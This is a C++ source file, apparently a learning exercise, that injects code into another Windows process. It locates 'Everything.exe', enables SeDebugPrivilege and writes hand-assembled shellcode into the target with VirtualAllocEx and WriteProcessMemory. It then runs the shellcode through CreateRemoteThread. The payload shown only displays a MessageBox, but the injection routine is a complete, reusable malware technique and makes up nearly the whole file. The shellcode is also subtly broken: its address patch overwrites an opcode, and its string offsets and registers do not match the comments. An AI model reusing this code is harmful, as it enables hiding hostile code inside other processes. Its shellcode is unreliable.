#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <tlhelp32.h>
#include <tchar.h>
#include <iostream>

// msfvenom -p windows/x64/messagebox TEXT="Hello hackers" -f C
/*
unsigned char payload[] = {
  0xfc,0x48,0x81,0xe4,0xf0,0xff,0xff,0xff,0xe8,0xd0,0x00,
 
  0xfc,0x48,0x81,0xe4,0xf0,0xff,0xff,0xff,0xe8,0xd0,0x00
};
unsigned int payload_len = 340;
*/
unsigned char payload[] = {
    0x48, 0x83, 0xEC, 0x28,                                     // sub rsp, 0x28
    0x48, 0x31, 0xC9,                                           // xor rcx, rcx          ; hWnd = NULL
    0x48, 0x8D, 0x15, 0x11, 0x00, 0x00, 0x00,                   // lea rdx, [rip+0x11]   ; lpText -> "Injected!"
    0x48, 0x8D, 0x0D, 0x11, 0x00, 0x00, 0x00,                   // lea rcx, [rip+0x11]   ; lpCaption -> "Hello"
    0xBA, 0x00, 0x00, 0x00, 0x00,                               // mov edx, 0            ; MB_OK
    0x48, 0xB8, 0xAD, 0x23, 0x86, 0x7C, 0xEF, 0xBE, 0xAD, 0xDE, // mov rax, MessageBoxA address (to patch)
    0xFF, 0xD0,                                                 // call rax
    0x48, 0x83, 0xC4, 0x28,                                     // add rsp, 0x28
    0xC3,                                                       // ret
    // Strings (offsets must match above LEAs)
    0x48, 0x65, 0x6C, 0x6C, 0x6F, 0x00,                         // "Hello"
    0x49, 0x6E, 0x6A, 0x65, 0x63, 0x74, 0x65, 0x64, 0x21, 0x00  // "Injected!"
};

unsigned int payload_len = sizeof(payload);

bool EnableDebugPrivilege() {
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        std::cerr << "OpenProcessToken failed. Error: " << GetLastError() << "\n";
        return false;
    }
    printf("\nYes");
    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
        std::cerr << "LookupPrivilegeValue failed. Error: " << GetLastError() << "\n";
        CloseHandle(hToken);
        return false;
    }
    printf("\nYes1");
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL)) {
        std::cerr << "AdjustTokenPrivileges failed. Error: " << GetLastError() << "\n";
        CloseHandle(hToken);
        return false;
    }
    printf("\nYes2");
    CloseHandle(hToken);
    printf("\nYes3");
    printf("\nError: %lu\n", GetLastError());
    //return true;
    return GetLastError() == ERROR_SUCCESS;
}

int FindTarget(const char *procname) {

        HANDLE hProcSnap;
        PROCESSENTRY32 pe32;
        int pid = 0;
                
        hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
                
        pe32.dwSize = sizeof(PROCESSENTRY32); 
                
        if (!Process32First(hProcSnap, &pe32)) {
                CloseHandle(hProcSnap);
                return 0;
        }
                
        while (Process32Next(hProcSnap, &pe32)) {
                if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
                        pid = pe32.th32ProcessID;
                        break;
                }
        }
                
        CloseHandle(hProcSnap);
                
        return pid;
}


int Inject(HANDLE hProc, unsigned char * payload, unsigned int payload_len)
 {

        LPVOID pRemoteCode = NULL;
        HANDLE hThread = NULL;

        FARPROC msgBox = GetProcAddress(GetModuleHandle("user32.dll"), "MessageBoxA");
        memcpy(&payload[26], &msgBox, sizeof(msgBox));

        pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
        WriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T *)NULL);
        
        hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteCode, NULL, 0, NULL);
        if (hThread != NULL) {
                printf("\nCreateRemoteThread/Process Injection Success");
                printf("Thread ID=%d", hThread);
                WaitForSingleObject(hThread, 500);
                CloseHandle(hThread);
                printf("\nCreateRemoteThread/Process Injection Success");
                return 0;
        }
        printf("\nCreateRemoteThread Failed");
        return -1;
}


int main(void) {
    
	int pid = 0;
    	HANDLE hProc = NULL;

	pid = FindTarget("Everything.exe");
    //pid = FindTarget("notepad++.exe");
    printf("Target is Found = %d", pid);
    //return -1;
	if (pid) {
		
        if (!EnableDebugPrivilege()) {
            std::cerr << "\nFailed to enable SeDebugPrivilege.\n";
            return 1;
        }
		// Open the target process
		hProc = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
				     PROCESS_VM_OPERATION  | PROCESS_VM_READ | PROCESS_VM_WRITE,
				     FALSE, (DWORD) pid);

		if (hProc != NULL) {
            printf("\nCall to Inject Code");
			Inject(hProc, payload, payload_len);
			CloseHandle(hProc);
		}
        else{
            printf("\nOpenprocess Failed.");
            printf("\nError: %lu\n", GetLastError());
        }
	}
    printf("\nLast");
	return 0;
}